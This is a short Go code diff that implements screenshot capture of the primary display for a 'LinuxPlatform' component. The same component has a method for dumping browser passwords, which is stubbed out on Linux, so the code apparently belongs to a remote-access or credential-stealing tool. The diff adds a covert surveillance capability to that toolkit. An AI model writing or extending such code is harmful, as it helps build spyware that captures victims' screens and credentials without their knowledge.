@@ -3,8 +3,11 @@
 package linux
 
 import (
-	"fmt"
+	"bytes"
+	"image/png"
 	"os/exec"
+
+	"github.com/kbinani/screenshot"
 )
 
 // LinuxPlatform represents the Linux platform.
@@ -39,7 +42,19 @@ func (p *LinuxPlatform) DumpBrowsers() string {
 	return "Browser password dumping not implemented for Linux."
 }
 
-// Screenshot does nothing on Linux.
+// Screenshot captures the primary display.
 func (p *LinuxPlatform) Screenshot() ([]byte, error) {
-	return nil, fmt.Errorf("screenshot not implemented for Linux")
+	bounds := screenshot.GetDisplayBounds(0)
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return nil, err
+	}
+
+	var buf bytes.Buffer
+	err = png.Encode(&buf, img)
+	if err != nil {
+		return nil, err
+	}
+
+	return buf.Bytes(), nil
 }
